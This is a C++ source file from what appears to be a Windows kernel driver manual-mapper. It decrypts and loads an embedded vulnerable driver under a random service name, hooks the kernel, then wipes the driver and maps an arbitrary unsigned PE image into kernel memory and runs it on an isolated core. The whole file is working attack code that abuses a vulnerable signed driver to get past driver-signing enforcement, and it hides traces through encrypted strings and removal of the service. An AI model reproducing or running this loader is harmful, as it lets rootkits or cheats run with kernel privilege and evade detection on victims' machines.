
namespace mapper
{
	struct dpc_context {
		std::uint64_t image_base;
		std::uint64_t entry_point;
		std::uint32_t image_size;
		std::uint32_t status;
	};

	bool execute( std::vector<std::uint8_t> image_bytes ) {
		logging::print( encrypt( "Loading vulnerable driver" ) );

		utility::decrypt_bytes(
			driver_bytes,
			sizeof( driver_bytes ),
			driver_bytes
		);

		auto pe_image = std::make_unique<image::c_image>( );
		if ( !pe_image->parse_headers( driver_bytes, sizeof( driver_bytes ) ) ) {
			logging::print( encrypt( "Failed to parse pe headers.\n" ) );
			return false;
		}

		if ( !service::load_driver_privilage( true ) ) {
			logging::print( encrypt( "Failed to enable driver loading privilege.\n" ) );
			return false;
		}

		wchar_t driver_name[ 20 ]{ };
		utility::gen_rnd_str( driver_name );
		if ( !service::install_service( driver_name ) ) {
			logging::print( encrypt( "Failed to install service.\n" ) );
			service::load_driver_privilage( false );
			return false;
		}

		if ( !g_driver->initialize( ) ) {
			logging::print( encrypt( "Failed to initialize driver.\n" ) );
			service::uninstall_service( driver_name );
			service::load_driver_privilage( false );
			return false;
		}

		if ( !g_kernel->install_hook( ) ) {
			logging::print( encrypt( "Failed to install hook.\n" ) );
			service::uninstall_service( driver_name );
			service::load_driver_privilage( false );
			return false;
		}

		crt::mem_zero(
			driver_bytes,
			sizeof( driver_bytes )
		);

		service::uninstall_service( driver_name );
		service::load_driver_privilage( false );

		pe_image = std::make_unique<image::c_image>( );
		if ( !pe_image->parse_headers( image_bytes ) ) {
			logging::print( encrypt( "Failed to parse pe headers.\n" ) );
			g_kernel->remove_hook( );
			return false;
		}

		auto allocation_base = reinterpret_cast< std::uint64_t >(
			exports::allocate_loaded_module( pe_image->get_size( ) )
			);
		if ( !allocation_base ) {
			logging::print( encrypt( "Failed to allocate kernel pages.\n" ) );
			g_kernel->remove_hook( );
			return false;
		}

		if ( !pe_image->zero_image( allocation_base ) ) {
			logging::print( encrypt( "Failed to zero image base.\n" ) );
			g_kernel->remove_hook( );
			return false;
		}

		if ( !pe_image->relocate( allocation_base ) ) {
			logging::print( encrypt( "Failed to relocate image base.\n" ) );
			g_kernel->remove_hook( );
			return false;
		}

		if ( !pe_image->map_imports( ) ) {
			logging::print( encrypt( "Failed to map image imports.\n" ) );
			g_kernel->remove_hook( );
			return false;
		}

		if ( !pe_image->map_delayed_imports( allocation_base ) ) {
			logging::print( encrypt( "Failed to map image delayed imports.\n" ) );
			g_kernel->remove_hook( );
			return false;
		}

		if ( !pe_image->map_sections( allocation_base ) ) {
			logging::print( encrypt( "Failed to map image sections.\n" ) );
			g_kernel->remove_hook( );
			return false;
		}

		auto entry_point = allocation_base + pe_image->get_entry_point( );
		logging::print( encrypt( "Entry point at: 0x%llx" ), entry_point );

		auto pte_address = exports::get_pte_address( entry_point );
		logging::print( encrypt( "Entry point PTE at: %llx" ), pte_address );

		auto va_pte = pte{ g_kernel->read_va<std::uint64_t>( pte_address ) };
		logging::print( encrypt( "PTE flags: Present=%d Execute=%d Write=%d\n" ),
			va_pte.hard.present,
			!va_pte.hard.no_execute,
			va_pte.hard.read_write
		);

		auto ctx = reinterpret_cast< dpc_context* >( exports::allocate_pool( sizeof( dpc_context ) ) );
		if ( !ctx ) {
			logging::print( encrypt( "Failed to allocate DPC context" ) );
			g_kernel->remove_hook( );
			return false;
		}

		dpc_context local_ctx = {};
		local_ctx.image_base = allocation_base;
		local_ctx.entry_point = entry_point;
		local_ctx.image_size = pe_image->get_size( );
		local_ctx.status = 1337;

		exports::memcpy(
			ctx,
			&local_ctx,
			sizeof( dpc_context )
		);

		auto target_core = exports::find_least_active_core( );
		if ( !exports::execute_on_specific_core( target_core,
			reinterpret_cast< void* >( entry_point ), ctx ) ) {
			logging::print( encrypt( "Failed to execute on isolated core" ) );
			g_kernel->remove_hook( );
			return false;
		}

		logging::print( encrypt( "Waiting for module initialization on core" ) );

		auto result = 1337;
		while ( result == 1337 ) {
			dpc_context dpc_ctx = {};
			exports::memcpy(
				&dpc_ctx,
				ctx,
				sizeof( dpc_context )
			);

			result = dpc_ctx.status;
			Sleep( 100 );
		}

		if ( result ) {
			logging::print( encrypt( "Failed to map payload on isolated core with %x" ) , result );
			g_kernel->remove_hook( );
			return false;
		}

		logging::print( encrypt( "Successfully mapped module on isolated core" ) );
		pe_image->protect_sections( );
		g_kernel->remove_hook( );
		return true;
	}
}